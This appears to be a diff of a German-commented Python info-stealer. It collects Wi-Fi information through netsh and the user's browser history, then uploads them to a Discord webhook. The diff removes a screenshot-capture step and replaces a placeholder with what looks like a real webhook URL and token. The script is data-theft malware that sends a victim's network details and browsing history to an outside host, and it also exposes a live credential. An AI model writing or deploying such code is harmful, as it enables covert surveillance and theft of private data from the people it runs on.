@@ -1,14 +1,9 @@
 import requests
 import subprocess
 import os
-from PIL import ImageGrab  # Verwende Pillow für Screenshots
 
 # Webhook URL
-webhook_url = 'https://discord.com/api/webhooks/your_webhook_url'
-
-def capture_screenshot(output_path):
-    screenshot = ImageGrab.grab()
-    screenshot.save(output_path)
+webhook_url = 'https://discord.com/api/webhooks/1282629894081351743/HypHouPjcge_6Q8VOHrUn4wwoXtYW802B1sBYNOvsFwj9wcOkz7Q9IUyiZv3RC-wtM5P'
 
 def get_wifi_info(output_path):
     # Führt den netsh-Befehl aus, um WLAN-Informationen zu erhalten
@@ -46,13 +41,9 @@ def send_files_to_discord(files):
 
 def main():
     # Pfade für Dateien
-    screenshot_path = 'screenshot.png'
     wifi_info_path = 'wifi_info.txt'
     browser_history_path = 'browser_history.txt'
 
-    # Screenshot des Bildschirms
-    capture_screenshot(screenshot_path)
-    
     # WLAN-Informationen abrufen
     get_wifi_info(wifi_info_path)
     
@@ -61,7 +52,6 @@ def main():
 
     # Dateien für die Übertragung vorbereiten
     files = {
-        'screenshot.png': open(screenshot_path, 'rb'),
         'wifi_info.txt': open(wifi_info_path, 'rb'),
         'browser_history.txt': open(browser_history_path, 'rb'),
     }
